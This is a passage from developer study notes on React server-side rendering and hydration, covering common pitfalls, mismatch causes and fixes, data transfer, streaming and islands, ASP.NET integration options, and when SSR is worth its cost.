**11. Date/time and currency formatted during render.** The server's locale and timezone are not the user's. Format on the server and send the string, or format in an effect.

**12. Forgetting you now maintain two environments.** No `window`, no `document`, no `localStorage`, no `IntersectionObserver` on the server. Every dependency in your tree must be SSR-safe — including third-party ones, which is frequently the blocker.

**13. Blaming yourself for extension-caused mismatches.** Grammarly, LastPass, Google Translate and dark-mode extensions mutate the DOM before React loads. Reproduce with extensions disabled before chasing a report.

**14. Not instrumenting `onRecoverableError`.** Mismatches degrade silently in production. If you don't log it, you will not know your SSR is being thrown away on 30% of page views.

**15. Setting the status code after streaming started.** Once bytes are on the wire the status is fixed. Decide 200/404/500 inside `onShellReady`, before the first `pipe()`.

**16. Calling `root.render()` on a hydration root before hydration finishes.** React clears the server HTML and switches the whole root to client rendering.

**17. Importing `react-dom/server` into client code.** Inflates the [[Bundle|bundle]] for zero benefit.

**18. Measuring only LCP.** SSR flatters LCP by construction. Watch **TBT** in the lab and **INP** in the field, or you will ship a regression and celebrate it.
```

## 📝 12. Key Takeaways

```ad-summary
title: 📝 Comprehensive Summary
**The problem.** A CSR React app ships an empty `<div id="root">`. The user sees a blank screen until the bundle downloads, parses and executes — and the fetch can't even *start* before then ([[Waterfall Effect]]). Bots that don't run JavaScript, which is every social unfurler, see nothing at all. That is the concrete content of the SEO row in [[5.5 - SPA vs MPA]].

**What SSR produces.** React runs the same components in a server-side JS runtime and serialises the output to HTML. ==Event handlers are closures and cannot be serialised==, so the server ships appearance without behaviour. **That gap is the whole reason hydration exists.** APIs: `renderToPipeableStream` (Node), `renderToReadableStream` (Web Streams), `renderToString` (no streaming, no data-waiting, emits Suspense *fallbacks*), `renderToStaticMarkup` (not hydratable — use it for emails, never for pages).

**What hydration is.** `hydrateRoot(container, <App />)` walks the existing server DOM, builds a matching [[Fiber Tree]], **claims** the nodes instead of creating them, and populates React's delegated [[Synthetic Event|event system]]. `createRoot(container).render(<App />)` does the opposite — it destroys the DOM and rebuilds it, so using it on server HTML silently throws away everything SSR bought you. React 18 replaced `ReactDOM.hydrate` with `hydrateRoot` (removed in 19), and that new root API is what makes selective hydration possible.

**The trade-off.** SSR improves FCP/LCP dramatically and frequently makes **TTI worse**, because hydration is extra main-thread work on top of the identical bundle. Between paint and hydration sits the **uncanny valley**: content fully visible, clicks silently dropped. ==SSR does not make your app faster — it makes it look ready sooner.== Whether that trade is good depends on whether your users interact in the first second.

**Mismatches.** React requires the **first client render pass** to reproduce the server's HTML exactly (everything after that pass is free). Breakers: `Date.now()`, `Math.random()`, `typeof window` branches, browser APIs in render, locale/timezone formatting, data drift, **invalid HTML nesting** (the browser rewrites the DOM, so React can never match — the classic "worked in CSR, broke under SSR" bug), extensions, stray whitespace, `identifierPrefix` drift. On mismatch React regenerates the subtree client-side — you lose the SSR benefit there, get a flash, and lose focus/scroll/input; in the worst case handlers attach to the wrong elements. Fixes: **`useEffect`+state** two-pass (costs a double render), **`suppressHydrationWarning`** (one leaf, cosmetic only, doesn't patch the DOM — a scalpel, not a fix), **`useSyncExternalStore` + `getServerSnapshot`** (best for stores, no second pass), and **fixing the markup**.

**Data transfer.** The server already fetched; refetching on mount costs a round trip, doubles API load and *causes* mismatches. Ship the data with the HTML (`window.__INITIAL_STATE__` or `<script type="application/json">`) and feed the identical object to both sides. ==Never `JSON.stringify` straight into a `<script>` tag== — escape `<` to `\u003c` or an attacker-supplied `</script>` becomes stored XSS, and escape `\u2028`/`\u2029` or ordinary pasted text will break your bundle.

**Going partial.** `<Suspense>` splits SSR into a fast **shell** plus streamed chunks, and doubles as a **hydration** boundary — React 18 hydrates boundaries independently, yields to the browser between them, and synchronously hydrates whatever the user just clicked. **Islands** (Astro) invert the default to zero JS unless opted in. **RSC** goes further still: Server Components are never sent to the browser, so their code and dependencies never enter the bundle and never hydrate — only `'use client'` subtrees do. Boundary placement is therefore a performance decision, not just a UX one.

**The .NET reality.** React SSR **requires a JS runtime on the server**, so ASP.NET must delegate to Node. `SpaServices`/`NodeServices` are removed; `SpaServices.Extensions` still ships but its prerendering API is `[Obsolete("Prerendering is no longer supported out of box")]` with no in-box replacement. `SpaProxy` is dev-time only and `UseSpaStaticFiles` is static-file serving — ==neither is SSR==. Realistic options: Next.js owns SSR with ASP.NET as a JSON API (Microsoft's guidance), or Razor Pages, or Blazor, or the underrated hybrid where **Razor renders the page and React mounts into a `<div>` via `createRoot`** — which is islands architecture with Razor as the generator, and is emphatically **not hydration** (empty container, no Node needed, no mismatches possible, and ==no SEO benefit for the React part==, since its content is absent from the first response).

**The honest verdict.** SSR + hydration is worth it for public, indexable, shareable content and for users on slow devices. It is **not** worth it for dashboards, editors, realtime apps, or anything behind a login — no crawler sees those, LCP amortises across a long session, and SSR makes the metric users actually feel (TTI/INP) worse while adding a Node runtime and a whole bug class. For the typical ASP.NET + React internal app, ==CSR is the correct engineering choice==; spend the effort on [[Code Splitting|code splitting]] instead, which improves LCP *and* TTI for everyone. The cheapest high-value compromise: **SSG your public pages, CSR your app.**

**And remember the vocabulary.** **DOM hydration** (`hydrateRoot`, needs SSR, mismatches possible) is not **data hydration** (filling a store/router from serialised server data — the [[RouterProvider]] sense, no SSR required, no mismatches). They're usually combined, because data hydration is *how you make* DOM hydration safe.
```
